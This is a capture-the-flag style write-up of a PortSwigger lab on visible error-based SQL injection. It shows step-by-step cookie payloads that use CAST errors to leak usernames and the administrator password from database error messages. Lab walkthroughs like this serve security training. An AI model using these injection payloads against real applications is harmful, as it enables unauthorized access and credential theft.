# Lab-13: [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned. 

The database contains a different table called ``` users ```, with columns called ``` username ``` and ``` password ```

**Aim :-** To solve the lab, find a way to leak the password for the ``` administrator ``` user, then log in to their account. 



## Solution
- Confirm **SQL Injection (SQLi)**
    - intercept the request in burp suit and add ``` ' ``` in the end of the **TrackingId cookie**, make the request and check the response.

    - The server responds with a **500 Internal Server Error** and shows a **SQL Syntax error** ``` Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'I4ggU0JW7FAKyOCO''. Expected  char ```

    - Add ``` '-- ``` to the end of the **TrackingId cookie** and make the request and the server responds with **200 OK**, confirms the SQL query executed without errors

    - Confirms **SQL injection**


- Confirm Boolean-Based SQLi
    - ``` ' AND CAST((SELECT 1) AS int)-- ``` The payload cast the value return ``` SELECT 1 ``` as **integer**
   
    - The server responds with a **500 Internal Server Error** and a error message ``` ERROR: argument of AND must be type boolean, not type integer Position: 63 ```

    - ``` ' AND 1=CAST((SELECT 1) AS int)-- ``` This payload cast the value return ``` SELECT 1 ``` as **integer** and compare with ``` 1 ``` which will return a boolean expression (True or False)

    - The server responds with a **200 OK** for the second payload confirms a **Boolean-Based SQLi**


- Confirm the **users**
    - ``` TrackingId=I4ggU0JW7FAKyOCO' AND 1=CAST((SELECT username FROM users) AS int)-- ``` 
        - The payload select username from users table and cast it to integer then compare with ``` 1 ```, will return a boolean value (True or False)
    
    - The server responds with a error message containing the payload ``` Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'I4ggU0JW7FAKyOCO' AND 1=CAST((SELECT username FROM users) AS'. Expected  char ```

    - The payload is truncated due to a character limit, to fix this remove the cokkie and resend the payload

    - ``` TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)-- ``` Now it returns a different error message 
    ``` ERROR: more than one row returned by a subquery used as an expression ``` This shows that the query executed and confirms the **users** table


- Retrieve the ``` administrator ``` **Password**
    - ``` ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- ``` this payload only return one row from the users table

    - The server responds with a error message like ``` ERROR: invalid input syntax for type integer: "administrator" ``` confirms that the only user that returning the query is the ``` administrator ```

    - ``` ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- ``` the payload selects the password and cast as integer
    
    - The server respond with a error message ``` ERROR: invalid input syntax for type integer: "qur9kqp1zqcm094j3bo2" ``` which contains the ``` administrator ``` password  
